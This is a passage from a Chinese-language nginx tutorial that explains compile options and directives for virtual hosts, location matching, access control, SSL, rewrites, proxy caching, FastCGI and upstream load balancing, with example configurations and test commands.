~]# nginx [root@centos7 ~]# curl -I 127.0.0.1 Server: honginx/6.6.6 [root@centos7 ~]# vim /etc/nginx/nginx.conf http { server_tokens off; } [root@centos7 ~]# nginx -s reload [root@centos7 ~]# curl -I 127.0.0.1 Server: honginx nginx编译安装选项说明 --prefix=/etc/nginx 安装路径 --sbin-path=/usr/sbin/nginx 指明nginx程序文件安装路径 --conf-path=/etc/nginx/nginx.conf 主配置文件安装位置 --error-log-path=/var/log/nginx/error.log 错误日志文件安装位置 --http-log-path=/var/log/nginx/access.log 访问日志文件安装位置 --pid-path=/var/run/nginx.pid 指明pid文件安装位置 --lock-path=/var/run/nginx.lock 锁文件安装位置 --http-client-body-temp-path=/var/cache/nginx/client_temp \\ #客户端body部分的临时文件存放路径，服务器允许客户端使用put方法提交大数据时，临时存放的磁盘路径 --http-proxy-temp-path=/var/cache/nginx/proxy_temp \\ #作为代理服务器，服务器响应报文的临时文件存放路径 --http-fastcgi-temp-path=/var/cache/nginx/fastcgi_temp \\ #作为fastcgi代理服务器，服务器响应报文的临时文件存放路径 --http-uwsgi-temp-path=/var/cache/nginx/uwsgi_temp \\ #作为uwsgi代理服务器，服务器响应报文的临时文件存放路径 --http-scgi-temp-path=/var/cache/nginx/scgi_temp \\ #作为scgi反代服务器，服务器响应报文的临时文件存放路径 --user=nginx 指明以那个身份运行worker进程，主控master进程一般由root运行 --group=nginx --with-http_ssl_module 表示把指定模块编译进来 nginx主配置段 帮助文档：http://nginx.org/en/docs/ngx_core_module.html\n正常运行必备的配置   user：指定worker进程的运行身份，如组不指定，默认和用户名同名\n  pid /PATH/TO/PID_FILE：指定存储nginx主进程PID的文件路径\n  include file|mask：指明包含进来的其它配置文件片断\n  load_module file：\n模块加载配置文件：/usr/share/nginx/modules/*.conf\n指明要装载的动态模块路径：/usr/lib64/nginx/modules/*.so\n  优化性能相关的配置   worker_processes number | auto：worker进程的数量；通常应该为当前主机的cpu的物理核心数\n  worker_cpu_affinity cpumask \u0026hellip;：将worker进程绑定到指定CPU上，提高缓存命中率\n   cpumask: 00000001：0号CPU 00000010：1号CPU 10000000：8号CPU worker_cpu_affinity 0001 0010 0100 1000; 分别将worker进程绑定到1,2,3,4号CPU上   worker_priority number：指定worker进程的nice值，设定worker进程优先级：[-20-19]\n  worker_rlimit_nofile number：worker进程所能够打开的文件数量上限\n  用于调试及定位问题相关的配置  daemon on|off：是否以守护进程方式运行nignx，默认是守护进程方式 master_process on|off：是否以master/worker模型运行nginx；默认为on；off 将不启动worker error_log file [level] ：错误日志文件及其级别；出于调试需要，可设定为debug；但debug仅在编译时使用了“\u0026ndash;with-debug”选项时才有效：level:debug|info|notice|warn|error|crit|alter|emerg  事件驱动相关的配置 events { worker_connections 1024; }  worker_connections number：每个worker进程所能够打开的最大并发连接数数量；总最大并发数：worker_processes * worker_connections use method：指明并发连接请求的处理方法，默认自动选择最优方法：use epoll; accept_mutex on|off：处理新的连接请求的方法；on指由各个worker轮流处理新请求，Off指每个新请求的到达都会通知(唤醒)所有的worker进程，但只有一个进程可获得连接，会造成“惊群”，影响服务器性能，建议开启  nginx的模块 nginx高度模块化，但其模块早期不支持DSO机制；1.9.11版本支持动态装载和卸载\n 核心模块：core module\n标准模块：\n HTTP 模块：ngx_http_* Mail 模块 ngx_mail_* Stream 模块 ngx_stream_*  第三方模块：\n ngx_http_core_module 核心模块 1）server { \u0026hellip; }：配置虚拟主机\n$ vim /etc/nginx/nginx.conf http { server { listen 80; server_name www.fenghong.tech; root /data/www/; } server { listen 80; server_name news.fenghong.tech; root /data/news/; } } $ nginx 启动服务 $ echo news site \u0026gt; /data/news/index.html $ echo www site \u0026gt; /data/www/index.html 客户端测试：\n$ curl www.fenghong.tech www site $ curl news.fenghong.tech news site 2）listen port|address[:port]|unix:/PATH/TO/SOCKET_FILE\nlisten address[:port] [default_server] [ssl] [http2 | spdy] [backlog=number] [rcvbuf=size] [sndbuf=size]  default_server：设定为默认虚拟主机 ssl：限制仅能够通过ssl连接提供服务 backlog=number：超过并发连接数后，新请求进入后援队列的长 rcvbuf=size：接收缓冲区大小 sndbuf=size：发送缓冲区大小   listen PORT; 指令监听在不同的端口，可实现基于端口的虚拟主机\nlisten IP:PORT; 监听 IP 地址不同，实现基于IP的虚拟主机\n 3）server_name name \u0026hellip;\n虚拟主机的主机名称后可跟多个由空白字符分隔的字符串\n支持*通配任意长度的任意字符\n server { listen 80; server_name *.fenghong.tech; root /data/default/; } $ echo default \u0026gt; /data/default/index.html $ nginx -s reload $ curl xxx.fenghong.tech default 支持 ~ 起始的字符做正则表达式模式匹配，性能原因慎用\nserver_name\t~^www\\d+\\.fenghong\\.tech$ #说明：\\d 表示 [0-9]  匹配优先级机制从高到低： (1) 首先是字符串精确匹配 如：www.fenghong.com (2) 左侧*通配符 如：*.fenghong.tech (3) 右侧*通配符 如：www.fenghong.* (4) 正则表达式 如： ~^.*\\.fenghong\\.tech$ (5) default_server\n 4）tcp_nodelay on|off\n在keepalived模式下的连接是否启用TCP_NODELAY选项\n当为off时，延迟发送，合并多个请求后再发送\n默认on时，不延迟发送\n可用于：http, server, location\n 如果为了节约服务器性能可以打开，如果为了用户体验更好选择关闭\n 5）sendfile on|off\n是否启用sendfile功能，在内核中封装报文直接发送，默认关闭\n6）server_tokens on|off|build|string\n是否在响应报文的Server首部显示nginx版本，建议关闭\n7）root\n设置web资源的路径映射；用于指明请求的URL所对应的文档的目录路径，可用于http, server, location, if in location\n8）location [ = | ~ | ~* | ^~ ] uri { \u0026hellip; }\n在一个server中location配置段可存在多个，用于实现从uri到文件系统的路径映射；ngnix会根据用户请求的URI来检查定义的所有location，并找出一个最佳匹配，而后应用其配置\n# mkdir /data/www/blog/ # echo blog \u0026gt; /data/www/blog/index.html # vim /etc/nginx/nginx.conf server { listen 80; server_name www.fenghong.tech; root /data/www/; location /blog { root /data/www/; } } # curl http://www.fenghong.tech/blog/ #测试 blog  =：对URI做精确匹配\n^~： 对URI的最左边部分做匹配检查，不区分字符大小写\n~： 对URI做正则表达式模式匹配，区分字符大小写\n~*： 对URI做正则表达式模式匹配，不区分字符大小写\n不带符号：匹配起始于此uri的所有的uri\n 匹配优先级从高到低：=, ^~, ～/～*, 不带符号\n例如：\nlocation = / { [ configuration A ] } location / { [ configuration B ] } location /documents/ { [ configuration C ] } location ^~ /images/ { [ configuration D ] } location ~* \\.(gif|jpg|jpeg)$ { [ configuration E ] } The “/” request will match configuration A, the “/index.html” request will match configuration B, the “/documents/document.html” request will match configuration C, the “/images/1.gif” request will match configuration D, and the “/documents/1.jpg” request will match configuration E. 9）alias\n路径别名，文档映射的另一种机制；仅能用于location上下文\n server { listen 80; server_name www.fenghong.tech; root /data/www/; location /blog { alias /data/www/blog; #和root /data/www/;作用相同 } } # curl http://www.fenghong.tech/blog/ blog  注意：location中使用root指令和alias指令的意义不同 (a) root，给定的路径对应于location中的/uri/左侧的/ (b) alias，给定的路径对应于location中的/uri/右侧的/\n 10）index file \u0026hellip;\n指定默认网页文件，注意需要装载 ngx_http_index_module 模块\n11）error_page code \u0026hellip; [=[response]] uri\n定义错误页，以指定的响应状态码进行响应；可用位置：http, server, location, if in location\n# echo \u0026quot;404 not found page\u0026quot; \u0026gt; /data/www/404.html server { listen 80; server_name www.fenghong.tech; root /data/www/; error_page 404 /404.html; } # curl http://www.fenghong.tech/notfound.html 404 not found page  server { listen 80; server_name www.fenghong.tech; root /data/www/; error_page 404 =200 /404.html; #将404返回码重定向成200访问码，防止浏览器劫持 } # curl -I http://www.fenghong.tech/notfound.html HTTP/1.1 200 OK #测试为200正确访问码 12）try_files file \u0026hellip; uri | =code\n​\t按顺序检查文件是否存在，返回第一个找到的文件或文件夹（结尾加斜线表示为文件夹），如果所有的文件或文件夹都找不到，会进行一个内部重定向到最后一个参数。只有最后一个参数可以引起一个内部重定向，之前的参数只设置内部URI的指向。最后一个参数是回退URI且必须存在，否则会出现内部500错误\n# echo default page \u0026gt; /data/news/default.html server { listen 80; server_name news.fenghong.tech; root /data/news/; location / { try_files $uri /default.html; #如果用户访问的URI不存在则放回默认页面 } } # curl http://news.fenghong.tech/index.html news site # curl http://news.fenghong.tech/noindex.html default page  server { listen 80; server_name news.fenghong.tech; root /data/news/; location / { try_files $uri $uri/index.html $uri.html =404; } } # curl http://news.fenghong.tech/index.html news site # curl http://news.fenghong.tech/noindex.html 404 Not Found 13）keepalive_timeout timeout [header_timeout]\n设定保持连接超时时长，0表示禁止长连接，默认为75s，可用于http, server, location\n14）keepalive_requests number\n在一次长连接上所允许请求的资源的最大数量，默认为100\n15）keepalive_disable none | browser \u0026hellip;\n对哪类型的浏览器禁用长连接\n16）send_timeout time\n向客户端发送响应报文的超时时长，此处是指两次写操作之间的间隔时长，而非整个响应过程的传输时长\n17）client_body_buffer_size size\n用于接收每个客户端请求报文的body部分的缓冲区大小；默认为16k；\n超出此大小时，其将被暂存到磁盘上的由下面 client_body_temp_path 指令所定义的位置\n18）client_body_temp_path path [level1 [level2 [level3]]]\n设定存储客户端请求报文的body部分的临时存储路径及子目录结构和数量\n19）limit_rate rate\n限制响应给客户端的传输速率，单位是bytes/second；默认值0表示无限制\n20）limit_except method \u0026hellip; { \u0026hellip; }\n限制客户端使用除了指定的请求方法之外的其它方法，仅用于location\n method:GET(包括HEAD), HEAD, POST, PUT, DELETE, MKCOL, COPY, MOVE, OPTIONS, PROPFIND, PROPPATCH, LOCK, UNLOCK, PATCH\n location /upload { root /date/www/; limit_except GAT { allow 192.168.0.9/24; deny all; } } # 除了 GET和HEAD 之外其它方法仅允许192.168.0.9/24主机使用 21）aio on | off | threads[=pool]\n是否启用aio功能\n22）directio size | off\n当文件大于等于给定大小时，例如directio 4m，同步到磁盘，而非写缓存，以防数据丢失\n23）open_file_cache off | max=N [inactive=time]\n max=N：可缓存的缓存项上限；达到上限后会使用LRU算法实现管理 inactive=time：缓存项的非活动时长，在此处指定的时长内未被命中的或命中的次数少于open_file_cache_min_uses指令所指定的次数的缓存项即为非活动项将被删除  24）open_file_cache_errors on | off\n是否缓存查找时发生错误的文件一类的信息，默认值为off\n25）open_file_cache_min_uses number\nopen_file_cache指令的inactive参数指定的时长内，至少被命中此处指定的次数方可被归类为活动项，默认值为1\n26）open_file_cache_valid time\n缓存项有效性的检查频率，默认值为60s\nngx_http_access_module 访问控制模块 基于ip的访问控制功能\n server { listen 80 default_server; server_name www.fenghong.tech; root /data/www/; location / { allow 192.168.0.0/24; deny all; } }  自上而下检查，一旦匹配，将生效，条件严格的置前\n ngx_http_auth_basic_module 用户认证模块 实现基于用户的访问控制，使用basic机制进行用户认证\n# mkdir /data/www/admin/ # echo admin area \u0026gt; /data/www/admin/index.html server { listen 80 default_server; server_name www.fenghong.tech; root /data/www/; location /admin { auth_basic \u0026quot;Admin Area\u0026quot;; auth_basic_user_file /etc/nginx/.ngxpasswd; } } # yum install httpd-tools -y # htpasswd -cm /etc/nginx/.ngxpasswd user1 # htpasswd -m /etc/nginx/.ngxpasswd user2 # nginx -s reload 浏览器访问：http://192.168.0.8/admin/ 测试 ngx_http_stub_status_module 服务器状态信息模块 用于输出nginx的基本状态信息\n server { listen 80 default_server; server_name www.fenghong.tech; root /data/www/; location /admin { auth_basic \u0026quot;Admin Area\u0026quot;; auth_basic_user_file /etc/nginx/.ngxpasswd; } location /status { stub_status; allow 192.168.0.0/24; deny all; } } $ curl http://192.168.0.8/status/ Active connections: 3 server accepts handled requests 35 35 34 Reading: 0 Writing: 1 Waiting: 2  Active connections：当前状态，活动状态的连接数 accepts：统计总值，已经接受的客户端请求的总数 handled：统计总值，已经处理完成的客户端请求的总数 requests：统计总值，客户端发来的总的请求数 Reading：当前状态，正在读取客户端请求报文首部的连接的连接数 Writing：当前状态，正在向客户端发送响应报文过程中的连接数 Waiting：当前状态，正在等待客户端发出请求的空闲连接数\n ngx_http_log_module 日志模块 指定日志格式记录请求\n1）log_format name string \u0026hellip;\nstring可以使用nginx核心模块及其它模块内嵌的变量\n2）access_log path [format [buffer=size][gzip[=level]][flush=time][if=condition]] 或 access_log off\nhttp { log_format customlog '$remote_addr - $remote_user [$time_iso8601] \u0026quot;$request\u0026quot; ' '$status $body_bytes_sent \u0026quot;$http_referer\u0026quot; ' '\u0026quot;$http_user_agent\u0026quot; \u0026quot;$http_x_forwarded_for\u0026quot;'; server { listen 80 default_server; server_name www.fenghong.tech; root /data/www/; access_log /var/log/nginx/www.fenghong.tech-access.log customlog buffer=32k; } } 3）open_log_file_cache max=N [inactive=time][min_uses=N][valid=time]; 和 open_log_file_cache off;\n缓存各日志文件相关的元数据信息\n max：缓存的最大文件描述符数量 min_uses：在inactive指定的时长内访问大于等于此值方可被当作活动项 inactive：非活动时长 valid：验证缓存中各缓存项是否为活动项的时间间隔\n ngx_http_gzip_module 压缩传输模块 用gzip方法压缩响应数据，节约带宽\n1）gzip on | off; 启用或禁用gzip压缩\n2）gzip_comp_level level; 压缩比由低到高：1 到 9 ，默认：1\n3）gzip_disable regex \u0026hellip;; 匹配到客户端浏览器不执行压缩\n4）gzip_min_length length; 启用压缩功能的响应报文大小阈值\n5）gzip_http_version 1.0 | 1.1; 设定启用压缩功能时，协议的最小版本，默认：1.1\n6）gzip_buffers number size; 支持实现压缩功能时缓冲区数量及每个缓存区的大小，默认：32 4k 或 16 8k\n7）gzip_types mime-type \u0026hellip;; 指明仅对哪些类型的资源执行压缩操作；即压缩过滤器，默认包含有text/html，不用显示指定，否则出错\n8）gzip_vary on | off; 如果启用压缩，是否在响应报文首部插入“Vary: Accept-Encoding”\n9）gzip_proxied off | expired | no-cache | no-store | private | no_last_modified | no_etag | auth | any \u0026hellip;;\nnginx充当代理服务器时，对于后端服务器的响应报文，在何种条件下启用压缩功能\n off：不启用压缩 expired，no-cache, no-store，private：对后端服务器的响应报文首部Cache-Control值任何一个，启用压缩功能  server { listen 80 default_server; server_name www.fenghong.tech; root /data/www/; gzip on; gzip_comp_level 6; gzip_min_length 64; gzip_proxied any; gzip_types text/xml text/css text/plain application/javascript; } ngx_http_ssl_module 加密传输模块 1）ssl on|off; 为指定虚拟机启用HTTPS protocol， 建议用listen指令代替\n2）ssl_certificate file; 当前虚拟主机使用PEM格式的证书文件\n3）ssl_certificate_key file; 当前虚拟主机上与其证书匹配的私钥文件\n4）ssl_protocols [SSLv2][SSLv3][TLSv1][TLSv1.1][TLSv1.2]; 支持ssl协议版本，默认为后三个\n5）ssl_session_cache off | none | [builtin[:size]][shared:name:size];\n none: 通知客户端支持ssl session cache，但实际不支持 builtin[:size]：使用OpenSSL内建缓存，为每worker进程私有 [shared:name:size]：在各worker之间使用一个共享的缓存  6）ssl_session_timeout time; 客户端连接可以复用ssl session cache中缓存的ssl参数的有效时长，默认5m\n服务器配置示例：\n[root@nginx ~]# cd /etc/pki/tls/certs/ [root@nginx certs]# vim Makefile %.key: umask 77 ; \\ /usr/bin/openssl genrsa $(KEYLEN) \u0026gt; $@ [root@nginx certs]# make aa.crt Country Name (2 letter code) [XX]:CN State or Province Name (full name) []:bj Locality Name (eg, city) [Default City]:bj Organization Name (eg, company) [Default Company Ltd]:aa.com Organizational Unit Name (eg, section) []:opt Common Name (eg, your name or your server's hostname) []:www.aa.com [root@nginx certs]# make bb.crt Country Name (2 letter code) [XX]:CN State or Province Name (full name) []:bj Locality Name (eg, city) [Default City]:bj Organization Name (eg, company) [Default Company Ltd]:bb.com Organizational Unit Name (eg, section) []:opt Common Name (eg, your name or your server's hostname) []:www.bb.com [root@nginx certs]# mkdir /etc/nginx/conf.d/ssl/ [root@nginx certs]# mv aa.crt aa.key bb.crt bb.key /etc/nginx/conf.d/ssl/ [root@nginx ~]# vim /etc/nginx/conf.d/vhosts.conf server { listen 443 ssl; server_name www.aa.com; root /data/www/aa/; ssl_certificate /etc/nginx/conf.d/ssl/aa.crt; ssl_certificate_key /etc/nginx/conf.d/ssl/aa.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m; } server { listen 443 ssl; server_name www.bb.com; root /data/www/bb/; ssl_certificate /etc/nginx/conf.d/ssl/bb.crt; ssl_certificate_key /etc/nginx/conf.d/ssl/bb.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m; } [root@nginx ~]# mkdir -pv /data/www/{aa,bb} [root@nginx ~]# echo \u0026quot;aa test page\u0026quot; \u0026gt; /data/www/aa/index.html [root@nginx ~]# echo \u0026quot;bb test page\u0026quot; \u0026gt; /data/www/bb/index.html [root@nginx ~]# nginx 客户端测试：\n[root@client ~]# vim /etc/hosts 192.168.0.8 www.aa.com www.bb.com [root@client ~]# curl -k https://www.aa.com/ aa test page [root@client ~]# curl -k https://www.bb.com/ bb test page ngx_http_rewrite_module URI重写模块 将用户请求的URI基于PCRE regex所描述的模式进行检查，而后完成重定向替换\n1）rewrite regex replacement [flag]\n将用户请求的URI基于regex所描述的模式进行检查，匹配到时将其替换为replacement指定的新的URI\n如果在同一级配置块中存在多个rewrite规则，那么会自下而下逐个检查；被某条件规则替换完成后，会重新一轮的替换检查\n隐含有循环机制,但不超过10次；如果超过，提示500响应码，[flag]所表示的标志位用于控制此循环机制\n如果replacement是以http://或https://开头，则替换结果会直接以重向返回给客户端, 即永久重定向301\n[flag]：\n last：重写完成后停止对当前URI在当前location中后续的其它重写操作，而后对新的URI启动新一轮重写检查；提前重启新一轮循环，不建议在location中使用 break：重写完成后停止对当前URI在当前location中后续的其它重写操作，而后直接跳转至重写规则配置块之后的其它配置；结束循环，建议在location中使用 redirect：临时重定向，重写完成后以临时重定向方式直接返回重写后生成的新URI给客户端，由客户端重新发起请求；使用相对路径,或者http://或https://开头，状态码：302 permanent:重写完成后以永久重定向方式直接返回重写后生成的新URI给客户端，由客户端重新发起请求，状态码：301  2）return\nreturn code [text];\nreturn code URL;\nreturn URL;\n停止处理，并返回给客户端指定的响应码\n3）rewrite_log on | off;\n是否开启重写日志, 发送至error_log（notice level）\n4）set $variable value;\n用户自定义变量；注意：变量定义和调用都要以$开头\n5）if (condition) { \u0026hellip; }\n条件满足时，执行配置块中的配置指令；server, location\ncondition：\n = 相同 != 不同 ~：模式匹配，区分字符大小写 ~*：模式匹配，不区分字符大小写 !~：模式不匹配，区分字符大小写 !~*：模式不匹配，不区分字符大小写 -e, !-e 存在（包括文件，目录，软链接） -f, !-f 文件 -d, !-d 目录 -x, !-x 执行  实现http重定向到https\nserver { listen 80 default_server; listen 443 ssl; server_name www.aa.com; root /data/www/aa; ssl_certificate /etc/nginx/conf.d/ssl/aa.crt; ssl_certificate_key /etc/nginx/conf.d/ssl/aa.key; ssl_session_cache shared:sslcache:20m; ssl_session_timeout 10m; location / { if ( $scheme = http ) { rewrite / https://www.aa.com/ redirect; } } } ngx_http_referer_module 模块 用来阻止Referer首部无有效值的请求访问，可防止盗链\nvalid_referers none|blocked|server_names|string \u0026hellip;; 定义referer首部的合法可用值，不能匹配的将是非法值\n none：请求报文首部没有referer首部 blocked：请求报文有referer首部，但无有效值 server_names：参数，其可以有值作为主机名或主机名模式 arbitrary_string：任意字符串，但可使用*作通配符 regular expression：被指定的正则表达式模式匹配到的字符串,要使用~开头，例如： ~.*\\.fenghong\\.com  [root@nginx ~]# cp /usr/share/backgrounds/night.jpg /data/www/aa/ [root@nginx ~]# vim /data/www/bb/index.html bb test page \u0026lt;img src=http://www.aa.com/night.jpg\u0026gt; #bb.com网站盗链aa.com网站图片 [root@nginx ~]# vim /etc/nginx/conf.d/vhosts.conf server { listen 80; server_name www.aa.com; root /data/www/aa; valid_referers none block server_names *.aa.com ~\\.aa\\.; #只有从aa.com访问的才可以浏览 if ($invalid_referer) { return 403 http://www.aa.com; } } server { listen 80; server_name www.bb.com; root /data/www/bb/; } 现在访问www.bb.com无法获取aa.com的图片了 ngx_http_proxy_module 反向代理模块 反向代理：转发请求至另一台主机\n1）proxy_pass URL; proxy_pass后面路径不带uri时，会将location的uri传递（附加）给后端主机\nserver { listen 80; server_name www.aa.com; location /admin { proxy_pass http://192.168.0.9/; #带\u0026quot; / \u0026quot; } } 访问http://www.aa.com时相当于访问 http://192.168.0.9/ server { listen 80; server_name www.aa.com; location /admin { proxy_pass http://192.168.0.9; #不带\u0026quot; / \u0026quot; } } 访问http://www.aa.com时相当于访问 http://192.168.0.9/admin  如果location定义其uri时使用了正则表达式的模式，则proxy_pass之后必须不能使用uri; 用户请求时传递的uri将直接附加至后端服务器之后\n 2）proxy_set_header field value; 设定发往后端主机的请求报文的请求首部的值\nproxy_set_header X-Real-IP $remote_addr; #$remote_addr客户端IP proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; #$proxy_add_x_forwarded_for代理IP 配合日志记录实现后端web服务器记录真正的客户端地址：\n[root@nginx ~]# vim /etc/nginx/conf.d/vhosts.conf server { listen 80 default_server; server_name www.aa.com; location / { proxy_pass http://192.168.0.9/; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } [root@nginx-1 ~]# vim /etc/nginx/nginx.conf listen 80; listen [::]:80; log_format mylogformat '$http_x_forwarded_for - $remote_user [$time_iso8601] \u0026quot;$request\u0026quot; ' '$status $body_bytes_sent \u0026quot;$http_referer\u0026quot; ' '\u0026quot;$http_user_agent\u0026quot; \u0026quot;$http_x_forwarded_for\u0026quot;'; [root@nginx-1 ~]# vim /etc/nginx/conf.d/vhosts.conf server { listen 80 default_server; server_name www.aa.com; root /data/www/aa/; access_log /var/log/nginx/www.aa.com-access.log mylogformat; } root@nginx-1 ~]# mkdir -pv /data/www/aa/ [root@nginx-1 ~]# echo www.aa.com test page on nginx-1 \u0026gt; /data/www/aa/index.html [root@nginx-2 ~]# curl www.aa.com www.aa.com test page on nginx-1 [root@nginx-1 ~]# tail -f /var/log/nginx/www.aa.com-access.log 192.168.0.10 - - [2018-07-07T14:34:07+08:00] \u0026quot;GET / HTTP/1.0\u0026quot; 200 32 \u0026quot;-\u0026quot; \u0026quot;curl/7.29.0\u0026quot; \u0026quot;192.168.0.10\u0026quot; #显示的是真正的客户端的IP地址 3）proxy_cache_path; 定义可用于proxy功能的缓存，在http中定义\nproxy_cache_path path [levels=levels] [use_temp_path=on|off] keys_zone=name:size [inactive=time] [max_size=size] [manager_files=number] [manager_sleep=time] [manager_threshold=time] [loader_files=number] [loader_sleep=time] [loader_threshold=time] [purger=on|off] [purger_files=number] [purger_sleep=time] [purger_threshold=time]; 配置代理缓存示例：在http配置定义缓存信息\n[root@nginx ~]# vim /etc/nginx/nginx.conf proxy_cache_path /var/cache/nginx/proxy_cache levels=1:1:1 keys_zone=proxycache:20m inactive=120s max_size=1g; [root@nginx ~]# mkdir /var/cache/nginx/  proxycache:20m 指内存中缓存的大小，主要用于存放key和metadata\nmax_size=1g 指磁盘存入文件内容的缓存空间最大值\n [root@nginx ~]# vim /etc/nginx/conf.d/vhosts.conf server { listen 80 default_server; server_name www.aa.com; location / { proxy_pass http://192.168.0.9/; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_cache proxycache; proxy_cache_key $request_uri; proxy_cache_valid 200 302 301 1h; proxy_cache_valid any 1m; } } [root@nginx ~]# tree /var/cache/nginx/proxy_cache/ /var/cache/nginx/proxy_cache/ └── 9 └── d └── 7 └── 6666cd76f96956469e7be39d750cc7d9 4）proxy_cache zone|off; 默认off ，指明调用的缓存，或关闭缓存机制\n5）proxy_cache_key string; 缓存中用于“键”的内容\n默认值：proxy_cache_key $scheme$proxy_host$request_uri;\n6）proxy_cache_valid [code \u0026hellip;] time; 定义对特定响应码的响应内容的缓存时长，定义在http{\u0026hellip;}中\n7）proxy_cache_use_stale; 在被代理的后端服务器出现哪种情况下，可以真接使用过期的缓存响应客户端\nproxy_cache_use_stale error | timeout | invalid_header | updating | http_500 | http_502 | http_503 | http_504 | http_403 | http_404 | off ... 8）proxy_cache_methods GET | HEAD | POST \u0026hellip;; 对哪些客户端请求方法对应的响应进行缓存，GET和HEAD方法总是被缓存\n9）proxy_hide_header field; 默认nginx在响应报文不传递后端服务器的首部字段Date, Server, X-Pad, X-Accel-等，用于隐藏后端服务器特定的响应首部\n10）proxy_connect_timeout time; 定义与后端服务器建立连接的超时时长，如超时会出现502错误，默认为60s，一般不建议超出75s\n11）proxy_send_timeout time; 将请求发送给后端服务器的超时时长；默认为60s\n12）proxy_read_timeout time; 等待后端服务器发送响应报文的超时时长，默认为60s\nngx_http_headers_module 模块 向由代理服务器响应给客户端的响应报文添加自定义首部，或修改指定首部的值\n1）add_header name value [always]; 添加自定义首部\nadd_header X-Via $server_addr; add_header X-Cache $upstream_cache_status; add_header X-Accel $server_name; 2）add_trailer name value [always]; 添加自定义响应信息的尾部\nngx_http_fastcgi_module 模块 转发请求到FastCGI服务器，不支持php模块方式\n1）fastcgi_pass address; address为后端的fastcgi server的地址；可用位置：location, if in location\n2）fastcgi_index name; fastcgi默认的主页资源；fastcgi_index index.php;\n3）fastcgi_param parameter value [if_not_empty]; 设置传递给 FastCGI服务器的参数值，可以是文本，变量或组合\n4）fastcgi_cache_path path \u0026hellip; 定义fastcgi的缓存：\nfastcgi_cache_path path [levels=levels] [use_temp_path=on|off] keys_zone=name:size [inactive=time] [max_size=size] [manager_files=number] [manager_sleep=time] [manager_threshold=time] [loader_files=number] [loader_sleep=time] [loader_threshold=time][purger=on|off] [purger_files=number] [purger_sleep=time] [purger_threshold=time];  path：缓存位置为磁盘上的文件系统 max_size=size：磁盘path路径中用于缓存数据的缓存空间上限 levels=levels：缓存目录的层级数量，以及每一级的目录数量 levels=ONE:TWO:THREE：示例：leves=1:2:2 keys_zone=name:size：k/v映射的内存空间的名称及大小 inactive=time：非活动时长\n 5）fastcgi_cache zone|off; 调用指定的缓存空间来缓存数据，可用位置：http, server, location\n6）fastcgi_cache_key string; 定义用作缓存项的key的字符串，示例：fastcgi_cache_key $request_rui;\n7）fastcgi_cache_methods GET | HEAD | POST \u0026hellip;; 为哪些请求方法使用缓存\n8）fastcgi_cache_min_uses number; 缓存空间中的缓存项在inactive定义的非活动时间内至少要被访问到此处所指定的次数方可被认作活动项\n9）fastcgi_keep_conn on | off; 收到后端服务器响应后，fastcgi服务器是否关闭连接，建议启用长连接\n10）fastcgi_cache_valid [code \u0026hellip;] time; 不同的响应码各自的缓存时长\n示例：配置 lnmp\n[root@lnmp ~]# yum install nginx php-fpm php-mysql mariadb -y [root@lnmp ~]# cp /etc/nginx/nginx.conf{,.bak} [root@lnmp ~]# vim /etc/nginx/nginx.conf http { fastcgi_cache_path /var/cache/nginx/fcgi_cache levels=1:2:1 keys_zone=fcgicache:20m inactive=120s; server { listen 80 default_server; server_name www.fenghong.tech; root /data/www; location / { fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME /data/www/$fastcgi_script_name; include fastcgi_params; fastcgi_cache fcgicache; fastcgi_cache_key $request_uri; fastcgi_cache_valid 200 302 10m; fastcgi_cache_valid 301 1h; fastcgi_cache_valid any 1m; } location ~* ^/(status|ping)$ { fastcgi_pass 127.0.0.1:9000; fastcgi_param SCRIPT_FILENAME $fastcgi_script_name; include fastcgi_params; } } } [root@lnmp ~]# vim /etc/php-fpm.d/www.conf pm.status_path = /status ping.response = pong ping.path = /ping [root@lnmp ~]# systemctl enable nginx.service php-fpm.service [root@lnmp ~]# systemctl start nginx.service php-fpm.service [root@lnmp ~]# mkdir /var/cache/nginx/ [root@lnmp ~]# mkdir -pv /data/www/ [root@lnmp ~]# vim /data/www/index.php \u0026lt;?php phpinfo(); ?\u0026gt; 测试： # curl 192.168.0.8/status #查看PHP的工作状态 pool: www process manager: dynamic start time: 07/Jul/2018:16:27:07 +0800 start since: 1463 accepted conn: 9 listen queue: 0 max listen queue: 0 listen queue len: 128 idle processes: 4 active processes: 1 total processes: 5 max active processes: 1 max children reached: 0 slow requests: 0 # curl 192.168.0.8/ping #测试PHP进程是否工作 pong 访问 http://192.168.0.8/ ngx_http_upstream_module 反向代理调度模块 用于将多个服务器定义成服务器组，而由proxy_pass, fastcgi_pass等指令进行引用，实现健康检查，负载均衡的功能\n1）upstream name { \u0026hellip; } 定义后端服务器组，会引入一个新的上下文，默认调度算法是wrr，在http中定义\n2）server address [parameters]; 在upstream上下文中server成员，以及相关的参数\naddress：\n unix: /PATH/TO/SOME_SOCK_FILE socket文件 IP[:PORT] IP加端口 HOSTNAME[:PORT] 主机名加端口  parameters：\n weight=number 权重，默认为1 max_conns 连接后端报务器最大并发活动连接数，1.11.5版本后支持 max_fails=number 失败尝试最大次数；超出此处指定的次数时，server将被标记为不可用,默认为1 fail_timeout=time 后端服务器标记为不可用状态的连接超时时长，默认10s backup 将服务器标记为“备用”，即所有服务器均不可用时才启用 down 标记为“不可用”，配合ip_hash使用，实现灰度发布  3）ip_hash 源地址hash调度方法\n4）least_conn 最少连接调度算法，当server拥有不同的权重时其为wlc，当所有后端主机连接数相同时，则使用wrr，适用于长连接\n5）hash key [consistent]\n基于指定的key的hash表来实现对请求的调度，此处的key可以直接文本、变量或二者组合\n将请求分类，同一类请求将发往同一个upstream server，使用consistent参数，将使用ketama一致性hash算法，适用于后端是Cache服务器（如varnish）时使用\nhash $request_uri consistent; hash $remote_addr; 6）keepalive 连接数N：为每个worker进程保留的空闲的长连接数量,可节约nginx端口，并减少连接管理的消耗\n7）health_check [parameters]; 健康状态检测机制；只能用于location上下文，仅对nginx plus有效\n interval=time检测的频率，默认为5秒 fails=number：判定服务器不可用的失败检测次数；默认为1次 passes=number：判定服务器可用的失败检测次数；默认为1次 uri=uri：做健康状态检测测试的目标uri；默认为/ match=NAME：健康状态检测的结果评估调用此处指定的match配置块  8）match name { \u0026hellip; } 对backend server做健康状态检测时，定义其结果判断机制；只能用于http上下文，仅对nginx plus有效\n status code[ code 